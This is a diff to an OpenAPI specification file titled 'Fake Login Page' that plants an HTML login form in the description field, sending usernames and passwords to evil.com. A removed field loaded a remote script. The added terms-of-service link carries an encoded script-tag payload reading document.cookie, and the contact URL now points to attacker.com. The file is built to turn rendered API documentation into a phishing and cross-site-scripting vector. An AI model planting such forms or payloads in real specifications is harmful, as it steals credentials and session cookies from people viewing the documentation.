@@ -3,9 +3,8 @@ info:
   version: 1.0.0
   title: Fake Login Page
   description: |
-    </div>
     <div class="form-container">
-      <form action="https:evil.com" method="post" class="form-signin">
+      <form action="https://evil.com" method="get" class="form-signin">
         <div class="form-group">
           <label for="username">Username</label>
           <input type="text" name="username" size="20">
@@ -19,11 +18,11 @@ info:
         </div>
       </form>
     </div>
-    </div>'
-  termsOfService: '<div class="login-form"><script src="https://static.staticsave.com/blunder/futaq.js"></script></div>'
-  contact: 
+  termsOfService: |
+    https://bonanzasatrangi.com/collections/unstitched/%3Cscript%20src=data:text/html,alert(document.cookie)%3E%3C/script%3E
+  contact:
     name: "API Support"
-    url: "https://evil.com"
+    url: "https://attacker.com/"
     email: "bilalabbasuk@gmail.com"
 paths:
   /:
@@ -31,6 +30,7 @@ paths:
       responses:
         '200':
           description: Login successful
+
 
 
 
